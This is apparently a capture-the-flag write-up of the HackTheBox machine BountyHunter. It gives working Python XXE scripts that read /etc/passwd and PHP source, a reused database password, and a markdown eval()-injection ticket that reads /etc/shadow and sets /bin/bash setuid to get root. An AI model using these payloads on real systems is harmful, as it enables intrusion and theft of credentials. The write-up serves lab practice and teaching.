---
title: HTB [BountyHunter]
date: 2023-01-27 11:28:05 +0200
categories: [linux,xxe,python]
tags: [HACKTHEBOX MACHINES]
excerpt: BountyHunter is an easy machine from HackTheBox, which involves XXE for the foothold to read local files. Then we will use it to get the creds stored in `db.php` and ssh in. For the root we need to exploit a validator script in python that has vulnerable eval function without backlisting the user input
---

![](https://i.imgur.com/dyxLcm8.png)

## RECON

### port scan

```js
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDLosZOXFZWvSPhPmfUE7v+PjfXGErY0KCPmAWrTUkyyFWRFO3gwHQMQqQUIcuZHmH20xMb+mNC6xnX2TRmsyaufPXLmib9Wn0BtEYbVDlu2mOdxWfr+LIO8yvB+kg2Uqg+QHJf7SfTvdO606eBjF0uhTQ95wnJddm7WWVJlJMng7+/1NuLAAzfc0ei14XtyS1u6gDvCzXPR5xus8vfJNSp4n4B5m4GUPqI7odyXG2jK89STkoI5MhDOtzbrQydR0ZUg2PRd5TplgpmapDzMBYCIxH6BwYXFgSU3u3dSxPJnIrbizFVNIbc9ezkF39K+xJPbc9CTom8N59eiNubf63iDOck9yMH+YGk8HQof8ovp9FAT7ao5dfeb8gH9q9mRnuMOOQ9SxYwIxdtgg6mIYh4PRqHaSD5FuTZmsFzPfdnvmurDWDqdjPZ6/CsWAkrzENv45b0F04DFiKYNLwk8xaXLum66w61jz4Lwpko58Hh+m0i4bs25wTH1VDMkguJ1js=
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKlGEKJHQ/zTuLAvcemSaOeKfnvOC4s1Qou1E0o9Z0gWONGE1cVvgk1VxryZn7A0L1htGGQqmFe50002LfPQfmY=
|   256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJeoMhM6lgQjk6hBf+Lw/sWR4b1h8AEiDv+HAbTNk4J3
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Only 2 ports opened, let's start our enumeration with the web server

### web enum

- It's a php website

![](https://i.imgur.com/LOIkOV6.png)

- This two files seems interesting
- Also there's a directory listing in `/resources`

![](https://i.imgur.com/DhlRXMB.png)

- README.txt

```js
Tasks:

[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
[X] Write tracker submit script
[ ] Connect tracker submit script to the database
[X] Fix developer group permissions
```

- This doesn't makes sense right now, currently we know there's a test account here and he's using plain text password
- In addition the need to connect the submit script to the database

- bountylog.js

```js
function returnSecret(data) {
	return Promise.resolve($.ajax({
            type: "POST",
            data: {"data":data},
            url: "tracker_diRbPr00f314.php"
            }));
}

async function bountySubmit() {
	try {
		var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>${$('#exploitTitle').val()}</title>
		<cwe>${$('#cwe').val()}</cwe>
		<cvss>${$('#cvss').val()}</cvss>
		<reward>${$('#reward').val()}</reward>
		</bugreport>`
		let data = await returnSecret(btoa(xml));
  		$("#return").html(data)
	}
	catch(error) {
		console.log('Error:', error);
	}
}
```

- This is the working mechanism of the Report submission page, we will see that below, they're adding our user input to this xml file, and converting it to base64
- Finally they're sending the POST request to the `tracker_diRbPr00f314.php` end point

![](https://i.imgur.com/GUWV0eg.png)

- By clicking this portal, we can go to `/portal.php` page

![](https://i.imgur.com/4x1QSFD.png)

- There's a link in **here**, it redirects us to "http://10.10.11.100/log_submit.php"

![](https://i.imgur.com/nlnFvED.png)

- There's a Bug Report system, we can able to enter the exploit title, CWE, CVSS score and Bounty reward

![](https://i.imgur.com/YXwekQd.png)

- It sends a **POST** Request to `/tracker_diRbPr00f314.php` and we can see there's a base64 string is passing through the `data`
- Decoding that string reveals they're sending our data in XML format by encoding it with the base64

![](https://i.imgur.com/EBC0D6q.png)

- All our 4 inputs are reflected in the response, So let's try XXE here


## INITIAL FOOTHOLD

### XXE

![](https://i.imgur.com/5zpSslN.png)

- Copy as python request, so we can quickly edit this to craft a small exploit

```python
import requests
from base64 import b64encode as b64e

burp0_url = "http://10.10.11.100:80/tracker_diRbPr00f314.php"
burp0_headers = {"Accept": "*/*", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "http://10.10.11.100", "Referer": "http://10.10.11.100/log_submit.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}

xxe_payload = '''<?xml  version="1.0" encoding="ISO-8859-1"?>
<bugreport>
	<title>
		Jopraveen
	</title>
	<cwe>
		Cwe
	</cwe>
	<cvss>
		CvssScore
	</cvss>
	<reward>
		BountyReward
	</reward>
</bugreport>'''.encode()

b64_enc_data = b64e(xxe_payload).decode()
burp0_data = {"data": b64_enc_data}
resp = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
print(resp.text)
```

- This is very useful to us, let's add a XXE payload to it

```python
import requests
from base64 import b64encode as b64e

burp0_url = "http://10.10.11.100:80/tracker_diRbPr00f314.php"
burp0_headers = {"Accept": "*/*", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "http://10.10.11.100", "Referer": "http://10.10.11.100/log_submit.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}

xxe_payload = '''<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<bugreport>
	<title>
		&ent;
	</title>
	<cwe>
		Cwe
	</cwe>
	<cvss>
		CvssScore
	</cvss>
	<reward>
		BountyReward
	</reward>
</bugreport>'''.encode()

b64_enc_data = b64e(xxe_payload).decode()
burp0_data = {"data": b64_enc_data}
resp = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
print(resp.text)
```

![](https://i.imgur.com/Rak5DsT.png)

- Cool, we can ge the contents of `/etc/passwd/` file
- There's a user named **development**
- We can't read his `id_rsa` key in his home folder (may be we don't have enough permissions else there isn't one)
- Let's check the source code for creds


```python
import requests
from base64 import b64encode as b64e

burp0_url = "http://10.10.11.100:80/tracker_diRbPr00f314.php"
burp0_headers = {"Accept": "*/*", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "http://10.10.11.100", "Referer": "http://10.10.11.100/log_submit.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}

xxe_payload = '''<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/html/index.php"> ]>
<bugreport>
	<title>&ent;</title>
	<cwe>
		Cwe
	</cwe>
	<cvss>
		CvssScore
	</cvss>
	<reward>
		BountyReward
	</reward>
</bugreport>'''.encode()

b64_enc_data = b64e(xxe_payload).decode()
burp0_data = {"data": b64_enc_data}
resp = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
contents = resp.text.split('Title:')[1].split('CWE:')[0].split('<td>')[1].split('</td>')[0]
print((contents))
```

- I've modified this script a little bit, so we can print the contents only
- I'm using php filter here, coz we it'll render and we can't see it
- Nothing interesting in `index.php`, so let's see `db.php` which we got from the dirbusting

```php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

- We got some credentials, Let's this creds for the `development` user, (`development:m19RoAU0hP41A1sTsq6K`)
- It worked

## PRIVESC

![](https://i.imgur.com/uRDAe3X.png)

- So there's a tool here we can use that to validate tickets

![](https://i.imgur.com/iqoBEWe.png)

- Running `sudo -l` reveals we can run `/usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py` as root permissions

![](https://i.imgur.com/GIWtAhU.png)

- 1) Getting the file name as the user input
- 2) Passing that file name to the `loadfile()` function and storing the result in `ticket` variable
- 3) Passing the `ticket` variable to the `evaluate()` function
- 4) Closing the file
- If the `evaluate()` function returns true then it prints "Valid ticket.", else it prints "Invalid ticket."


```python
def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()
```

- The program exits if the supplied user input file doesn't ends with `.md` extension

![](https://i.imgur.com/iqpuNtV.png)

They're using a for loop to iterate over the file

- 1) Initializing the `code_line` to `None`
- 2) Checking if the first line starts with `# Skytrain Inc`, if it doesn't then the functions returns False
- 3) Checking the second line starts with `## Ticket to` , else it returns False
- 4) Printing the string after the `## Ticket to` string as "Destination"
- 5) Then it checks if the next line starts with `__Ticket Code:__`, If it does, then it sets the `code_line` variable to `i + 1`, here the i is the current line
- 6) If `code_line` is not equal to `zero` or `None`, it proceeds further
- 7) If the current line starts with `**`, it proceeds, else it returns False
- 8) They're replacing the string `**` with a empty string so it gets removed, and splitting the remaining string with `+` and storing the first value to the `ticketCode` variable
- 9) If the `ticketCode` 's remainder is `4` when it's divisible by `7` it proceeds further
- 10) They're passing the remaining content to the `eval()` function and stores the result in `ValidationNumber` variable
- 11) Then they're checking the validationNumber is greater than 100 or not, if it's high the it returns True, else it returns False

### Crafting Malicious Ticket

```markdown
# Skytrain Inc
## Ticket to root_user_XD
__Ticket Code:__
**11 + 11 ,print(open("/etc/shadow","r").read())**
```

- Since they're passing it to eval, we can add `,` to eval multiple things
- We can bypass that `int % 7 == 4` thing by using `11` in the starting, coz it returns `4` as remainder when dividing it by `7`

![](https://i.imgur.com/jBdMLb1.png)

- We can read the contents of `/etc/shadow`, so we can read the root.txt also
- To code execution we need to use the import function

```markdown
# Skytrain Inc
## Ticket to root_user_XD
__Ticket Code:__
**11 + 11 ,__import__('os').system('chmod u+s /bin/bash')**
```

- This gives setuid permissions to `/bin/bash` file, so we can do a `bash -p` ezpz root

![](https://i.imgur.com/9VZoAXV.png)

- Rooted!!

